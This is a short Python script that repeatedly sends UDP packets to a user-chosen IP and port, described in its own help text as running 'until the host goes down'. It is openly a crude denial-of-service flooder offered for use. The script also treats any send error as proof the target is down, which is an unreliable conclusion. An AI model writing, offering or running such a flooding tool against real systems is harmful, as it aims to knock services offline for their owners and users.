import socket
import argparse
import time
from tqdm import tqdm

class UDPPacketSender:
    def __init__(self, ip, port, message):
        self.ip = ip
        self.port = port
        self.message = message
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def send_packets(self):
        try:
            while True:
                self.sock.sendto(self.message.encode(), (self.ip, self.port))
                print(f"\033[31mSent message to {self.ip}:{self.port}\033[0m")
                for _ in tqdm(range(100), desc="\033[32mWaiting...\033[0m", bar_format="\033[31m{l_bar}{bar}\033[0m"):
                    time.sleep(0.01)
        except Exception as e:
            print("\033[31mHost is down\033[0m")
            print(f"\033[31mError: {e}\033[0m")
        finally:
            self.sock.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Send UDP packets to a specified IP and port until the host goes down.')
    parser.add_argument('--ip', type=str, required=True, help='The target IP address')
    parser.add_argument('--port', type=int, required=True, help='The target port')
    parser.add_argument('--message', type=str, required=True, help='The message to send')

    args = parser.parse_args()

    sender = UDPPacketSender(args.ip, args.port, args.message)
    sender.send_packets() 
